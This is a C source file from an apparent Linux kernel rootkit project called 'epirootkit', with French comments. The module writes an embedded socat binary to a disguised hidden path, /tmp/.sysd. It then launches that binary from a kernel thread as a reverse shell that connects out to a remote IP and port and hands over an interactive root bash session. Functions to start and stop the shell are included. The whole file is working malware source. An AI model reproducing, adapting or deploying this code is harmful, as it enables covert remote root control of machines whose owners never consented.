#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/file.h>
#include <linux/err.h>
#include <linux/slab.h>
#include <linux/kmod.h>
#include <linux/sched.h>   // Pour les structures de processus
#include <linux/completion.h>  // Pour attendre la fin du processus
#include <linux/kthread.h>

#include "epirootkit.h"
#include "socat.h"

struct task_struct *socat_task = NULL;  // Pour suivre le processus `socat`
struct completion socat_completion;  // Pour savoir quand `socat` a terminé

int is_socat_binaire_dropped(void){
	struct file *f;
	f = filp_open(SOCAT_BINARY_PATH, O_RDONLY, 0);
	if (IS_ERR(f))
		return false;
	filp_close(f, NULL);
	return true;
}

int drop_socat_binaire(void){
	if(is_socat_binaire_dropped()) {
		pr_info("drop_socat_binaire: socat binary already dropped\n");
		return SUCCESS;
	}

    struct file *f;
    loff_t pos = 0;

    f = filp_open(SOCAT_BINARY_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0700);
    if (IS_ERR(f)) {
        pr_err("drop_socat_binaire: failed to open file: %ld\n", PTR_ERR(f));
        return -FAILURE;
    }

    unsigned int written = kernel_write(f, socat, socat_len, &pos);
    if (written < 0) {
        pr_err("drop_socat_binaire: kernel_write failed: %u\n", written);
		filp_close(f, NULL);
		return -FAILURE;
	} else if (written < socat_len) {
		pr_err("drop_socat_binaire: only %u bytes written, expected %u\n", written, socat_len);
		filp_close(f, NULL);
		return -FAILURE;
    } else {
        pr_info("socat written successfully (%u bytes)\n", written);
    }

    filp_close(f, NULL);

	return SUCCESS;
}

// Fonction pour gérer la fin du processus
static int socat_task_fn(void *data) {
    int ret;

    char ip_port[32];
	snprintf(ip_port, sizeof(ip_port), "TCP:%s:%d", ip, REVERSE_SHELL_PORT);

	char *argv[] = {
		"/tmp/.sysd",
		ip_port,
		"EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
		NULL
	};

    char *envp[] = {
        "HOME=/",
        "PATH=/usr/bin:/bin:/usr/sbin:/sbin:/tmp",
        NULL
    };

    // Lancer `socat` via call_usermodehelper
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if (ret < 0) {
        pr_err("socat_task_fn: socat reverse shell failed: %d\n", ret);
        return ret;
    }

    pr_info("socat_task_fn: socat reverse shell launched\n");

    // Attendre que `socat` termine
    wait_for_completion(&socat_completion);

    pr_info("socat_task_fn: socat reverse shell exited\n");

    return 0;
}

void launch_reverse_shell(void)
{
    // Initialisation de la structure de synchronisation
    init_completion(&socat_completion);

    // Créer un nouveau thread pour exécuter socat
    socat_task = kthread_run(socat_task_fn, NULL, "socat_task");
    if (IS_ERR(socat_task)) {
        pr_err("launch_reverse_shell: failed to create socat task: %ld\n", PTR_ERR(socat_task));
    } else {
        pr_info("launch_reverse_shell: socat task started\n");
    }
}

// Fonction pour arrêter socat et nettoyer les ressources
void stop_reverse_shell(void)
{
    if (socat_task) {
        pr_info("stop_reverse_shell: stopping socat task\n");
        complete(&socat_completion);  // Terminer `socat`
        kthread_stop(socat_task);  // Arrêter le thread de socat
        socat_task = NULL;
    }else
		pr_info("stop_reverse_shell: socat task is not running\n");

}